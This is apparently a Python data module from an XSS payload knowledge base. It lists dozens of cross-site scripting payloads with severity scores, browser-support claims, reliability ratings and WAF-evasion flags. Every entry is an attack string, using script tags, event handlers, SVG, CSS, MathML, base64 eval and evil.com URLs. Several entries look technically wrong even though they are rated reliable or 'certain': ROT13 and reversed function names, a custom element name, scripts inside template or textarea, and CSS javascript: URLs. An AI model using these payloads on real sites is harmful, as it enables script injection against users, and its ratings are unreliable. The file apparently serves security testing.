#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Modern Base Payloads - Part 1
"""

from typing import Dict

from ..models import PayloadEntry


MODERN_BASE_PAYLOADS_PART1: Dict[str, PayloadEntry] = {
    "xml_cdata_injection": PayloadEntry(
        payload="<content><![CDATA[<script>alert(1)</script>]]></content>",
        contexts=["xml"],
        severity="high",
        cvss_score=7.5,
        description="XML CDATA injection",
        tags=["xml", "cdata", "script"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # Advanced bypass techniques
    "bypass_html5_entities": PayloadEntry(
        payload="&lpar;script&gt;alert(1)&lt;/script&gt;",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="HTML5 entity encoding bypass",
        tags=["encoding", "entity", "html5"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
        waf_evasion=True,
    ),
    "bypass_css_unicode": PayloadEntry(
        payload="\\00003cscript\\00003ealert(1)\\00003c/script\\00003e",
        contexts=["css", "html_content"],
        severity="high",
        cvss_score=7.5,
        description="CSS Unicode encoding bypass",
        tags=["css", "unicode", "encoding"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
        waf_evasion=True,
    ),
    "bypass_js_octal": PayloadEntry(
        payload="\\52alert(1)\\52",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.1,
        description="JavaScript octal encoding bypass",
        tags=["javascript", "octal", "encoding"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
        waf_evasion=True,
    ),
    # More modern web payloads
    "modern_web_components": PayloadEntry(
        payload="<x-script-alert-1></x-script-alert-1>",
        contexts=["custom_elements"],
        severity="medium",
        cvss_score=6.1,
        description="Web Components element name XSS",
        tags=["web-components", "element-name", "modern"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "modern_shadow_root": PayloadEntry(
        payload="<template><script>alert(1)</script></template>",
        contexts=["shadow_dom"],
        severity="high",
        cvss_score=7.3,
        description="Shadow DOM template injection",
        tags=["shadow-dom", "template", "encapsulation"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # More comprehensive payloads for testing
    "comprehensive_6": PayloadEntry(
        payload="<math><mtext><script>alert(1)</script></mtext></math>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="MathML element XSS",
        tags=["mathml", "mathematical", "markup"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "comprehensive_7": PayloadEntry(
        payload="<picture><source srcset=x onerror=alert(1)></picture>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Picture element XSS",
        tags=["picture", "responsive", "image"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "comprehensive_8": PayloadEntry(
        payload="<dialog open onclose=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Dialog element XSS",
        tags=["dialog", "modal", "html5"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "comprehensive_9": PayloadEntry(
        payload="<progress value=1 max=1 onprogress=alert(1)>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="Progress element XSS",
        tags=["progress", "html5", "onprogress"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "comprehensive_10": PayloadEntry(
        payload="<meter value=1 max=1 onmouseover=alert(1)>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="Meter element XSS",
        tags=["meter", "html5", "measurement"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # Advanced encoding and obfuscation
    "obfuscation_base64": PayloadEntry(
        payload="<script>eval(atob('YWxlcnQoMSk='))</script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Base64 encoded script",
        tags=["base64", "encoding", "obfuscation"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
        waf_evasion=True,
    ),
    "obfuscation_rot13": PayloadEntry(
        payload="<script>nypngr(1)</script>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="ROT13 obfuscated script",
        tags=["rot13", "obfuscation", "encoding"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
        waf_evasion=True,
    ),
    "obfuscation_reverse": PayloadEntry(
        payload="<script>trela(1)</script>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="Reversed function name",
        tags=["reverse", "obfuscation", "function"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
        waf_evasion=True,
    ),
    # More protocol attacks
    "protocol_ftp_injection": PayloadEntry(
        payload="ftp://user:pass@evil.com/<script>alert(1)</script>",
        contexts=["url"],
        severity="low",
        cvss_score=4.1,
        description="FTP URL injection",
        tags=["ftp", "url", "credentials"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    "protocol_ldap_injection": PayloadEntry(
        payload="ldap://evil.com/dc=<script>alert(1)</script>",
        contexts=["url"],
        severity="low",
        cvss_score=4.1,
        description="LDAP URL injection",
        tags=["ldap", "url", "directory"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # More event handler attacks
    "event_onbeforeunload": PayloadEntry(
        payload="<body onbeforeunload=alert(1)>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="Beforeunload event XSS",
        tags=["beforeunload", "event", "navigation"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "event_onresize": PayloadEntry(
        payload="<div onresize=alert(1)>Resize me</div>",
        contexts=["html_content"],
        severity="low",
        cvss_score=4.1,
        description="Resize event XSS",
        tags=["resize", "event", "window"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    "event_onscroll": PayloadEntry(
        payload="<div onscroll=alert(1) style='height:2000px'>Scroll</div>",
        contexts=["html_content"],
        severity="low",
        cvss_score=4.1,
        description="Scroll event XSS",
        tags=["scroll", "event", "user-interaction"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # More form-based attacks
    "form_input_value": PayloadEntry(
        payload="<input value='<script>alert(1)</script>'>",
        contexts=["html_attribute"],
        severity="high",
        cvss_score=7.5,
        description="Input value XSS",
        tags=["form", "input", "value"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "form_textarea_default": PayloadEntry(
        payload="<textarea><script>alert(1)</script></textarea>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Textarea default value XSS",
        tags=["form", "textarea", "default"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # Advanced CSS attacks
    "css_font_face": PayloadEntry(
        payload="@font-face { font-family: 'xss'; src: url('javascript:alert(1)') }",
        contexts=["css"],
        severity="high",
        cvss_score=7.5,
        description="CSS font-face injection",
        tags=["css", "font-face", "external"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "css_animation": PayloadEntry(
        payload="@keyframes xss { 0% { } 100% { background: url('javascript:alert(1)') } }",
        contexts=["css"],
        severity="high",
        cvss_score=7.5,
        description="CSS animation injection",
        tags=["css", "animation", "keyframes"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # More SVG attacks
    "svg_feimage": PayloadEntry(
        payload="<svg><feImage href='javascript:alert(1)'></feImage></svg>",
        contexts=["svg"],
        severity="high",
        cvss_score=7.3,
        description="SVG feImage filter XSS",
        tags=["svg", "filter", "feimage"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "svg_mask_injection": PayloadEntry(
        payload="<svg><mask><script>alert(1)</script></mask></svg>",
        contexts=["svg"],
        severity="high",
        cvss_score=7.3,
        description="SVG mask injection",
        tags=["svg", "mask", "script"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
}
